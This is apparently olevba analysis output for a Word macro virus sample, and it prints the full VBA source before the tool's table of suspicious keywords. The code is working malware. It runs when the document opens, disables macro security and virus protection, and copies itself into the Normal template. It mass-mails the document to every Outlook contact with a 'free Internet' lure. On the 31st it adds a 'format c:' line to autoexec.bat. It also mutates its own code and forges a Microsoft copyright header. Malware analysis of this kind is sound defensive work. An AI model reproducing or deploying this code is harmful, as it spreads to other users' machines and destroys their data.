olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.es-45fdaf3bf51b8af505cb6329c22eff4bf0305dd6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.es-45fdaf3bf51b8af505cb6329c22eff4bf0305dd6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()

On Error Resume Next

With Dialogs(wdDialogFileSummaryInfo)

.Author = Chr(45) + Chr(61) + Chr(68) + Chr(97) + Chr(71) + Chr(111) + Chr(78) + Chr(61) + Chr(45)

.Title = Chr(66) + Chr(108) + Chr(65) + Chr(99) + Chr(75) + Chr(32) + Chr(68) + Chr(97) + Chr(89) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

.Subject = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(97) + Chr(32) + Chr(66) + Chr(108) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(68) + Chr(97) + Chr(121) + Chr(33)

.Comments = Chr(84) + Chr(104) + Chr(120) + Chr(32) + Chr(116) + Chr(111) + Chr(32) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(98) + Chr(114) + Chr(101) + Chr(97) + Chr(107) + Chr(101) + Chr(114) + Chr(115) + Chr(46)

.Keywords = Chr(32) + Chr(124) + Chr(32) + Chr(66) + Chr(108) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(68) + Chr(97) + Chr(121) + Chr(32) + Chr(124) + Chr(32) + Chr(68) + Chr(97) + Chr(71) + Chr(111) + Chr(78) + Chr(32) + Chr(124) + Chr(32) + Chr(73) + Chr(116) + Chr(65) + Chr(108) + Chr(89) + Chr(32) + Chr(124) + Chr(32)

.Execute

End With

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then

CommandBars("Macro").Controls("Security...").Enabled = False

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

End If

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "" Then

CommandBars("Tools").Controls("Macro").Enabled = False

Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)

End If

CommandBars("tools").Controls("Customize...").Enabled = False

CommandBars("view").Controls("Toolbars").Enabled = False

CommandBars("view").Controls("Status Bar").Enabled = False

WordBasic.DisableAutoMacros 0

ActiveDocument.ReadOnlyRecommended = False

Application.ScreenUpdating = False

Application.DisplayStatusBar = False

Application.DisplayAlerts = False

UN92 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

MM84 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Application.EnableCancelKey = 0

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set IA14 = ActiveDocument.VBProject.VBComponents.Item(1)

BN71 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set IA14 = NormalTemplate.VBProject.VBComponents.Item(1)

MT5 = True

End If

If MT5 = True Then

ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\windows\Kernel32.sys"

IA14.CodeModule.AddFromFile ("c:\windows\Kernel32.sys")

IA14.CodeModule.deletelines 1, 4

IA14.CodeModule.replaceline 1, "Sub Document_Close()"

ElseIf BN71 = True Then

IA14.CodeModule.AddFromFile ("c:\windows\Kernel32.sys")

IA14.CodeModule.deletelines 1, 4

End If

whereits = ActiveDocument.FullName

ActiveDocument.SaveAs Environ("WINDIR") & "\free.doc"

DoEvents

ActiveDocument.SaveAs whereits

DoEvents

Set Black_OApp = CreateObject("Outlook.Application")

Set Black_Mapi = Black_OApp.GetNameSpace("MAPI")

For Each Black_AddList In Black_Mapi.AddressLists

If Black_AddList.AddressEntries.Count <> 0 Then

Black_Count = Black_AddList.AddressEntries.Count

For Black_AddListCount = 1 To Black_Count

Set Black_AddListEntry = Black_AddList.AddressEntries(Black_AddListCount)

Set Black_msg = Black_OApp.CreateItem(0)

Black_msg.To = Black_AddListEntry.Address

Black_msg.Subject = "Internet Now FREE, it's the future!!!"

Black_msg.Body = "No more money to surf, NOW it's Free..." + vbCrLf + "Read now, check this!"

Black_msg.Attachments.Add Environ("WINDIR") & "\free.doc"

Black_msg.DeleteAfterSubmit = True

If Black_msg.To <> "" Then

Black_msg.Send

DoEvents

End If

DoEvents

Next

End If

Next

If Day(Now) = 31 Then
    
SetAttr "c:\autoexec.bat", 0
   
Open "c:\autoexec.bat" For Append As #1

Print #1, "PATH=%PATH%;C:\DOS;C:\WINDOWS\COMMAND"

Print #1, "echo y | format c:/u/V:BLACKDAY >nul"

Close #1

End If

With IA14.CodeModule

For x = 2 To (IA14.CodeModule.CountOfLines - 14) Step 2

For y = 1 To (Int(Rnd * 10) + 2)

LC52 = LC52 + (Chr(65 + Int(Rnd * 20))) & (Chr(122 - Int(Rnd * 20))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 20))) & (Chr(122 - Int(Rnd * 20))) & " + "

Next y

.replaceline x, (Chr(65 + Int(Rnd * 20))) & " = " & LC52 & (Chr(65 + Int(Rnd * 20)))

LC52 = ""

Next x

End With

YAD_KCALB:

If MT5 = True Then

IA14.CodeModule.replaceline 213, "Sub ToolsMacro()"

IA14.CodeModule.replaceline 215, "End Sub"

IA14.CodeModule.replaceline 217, "Sub FileTemplates()"

IA14.CodeModule.replaceline 219, "End Sub"

IA14.CodeModule.replaceline 221, "Sub ViewVBCode()"

IA14.CodeModule.replaceline 223, "End Sub"

End If

If BN71 = True Then

IA14.CodeModule.replaceline 213, "' *****************************************************************"

IA14.CodeModule.replaceline 215, "' Created by Microsoft Product Support Services"

IA14.CodeModule.replaceline 217, "' Copyright (c) 2000 Microsoft Corp."

IA14.CodeModule.replaceline 219, "' Created June 30th, 2000: Don't CHANGE This File"

IA14.CodeModule.replaceline 221, "' Description : System Word File - Millenium Edition, All bug fixed"

IA14.CodeModule.replaceline 223, "' *****************************************************************"

End If

End Sub

' *****************************************************************

' Created by Microsoft Product Support Services

' Copyright (c) 2000 Microsoft Corp.

' Created June 30th, 2000: Don't CHANGE This File

' Description : System Word File - Millenium Edition, All bug fixed

' *****************************************************************



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
